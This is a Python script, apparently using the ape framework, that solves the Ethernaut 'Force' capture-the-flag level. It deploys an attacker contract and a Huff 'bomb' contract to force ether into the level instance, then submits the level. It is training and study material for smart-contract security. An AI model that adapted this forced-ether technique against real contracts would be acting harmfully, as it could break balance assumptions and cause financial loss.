from ape import accounts, project
from .utils.helper import get_level_instance, level_completed, deploy_huff_contract

ETHERNAUT = "0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6"
LEVEL = "0x11cCE3573D4508c25285D42a93F0A1e8EbB50cfa"


def main():
    # setting up user
    user = accounts.load("YOUR_ALIAS")
    user.set_autosign(enabled=True)  # make sure you are on testnet

    # get level instance
    instance, ethernaut = get_level_instance(ETHERNAUT, LEVEL, user)

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    hacker = project.Force.deploy(instance, sender=user, value="1 wei")

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")

    print(f"\n--- Instance balance before exploit: {hacker.balanceOf()} ---\n")

    # deploying bomb contract
    huff_bomb = deploy_huff_contract("Bomb.huff", user)

    hacker.attack(huff_bomb, sender=user)

    print(f"\n--- Instance balance after exploit: {hacker.balanceOf()} ---\n")

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
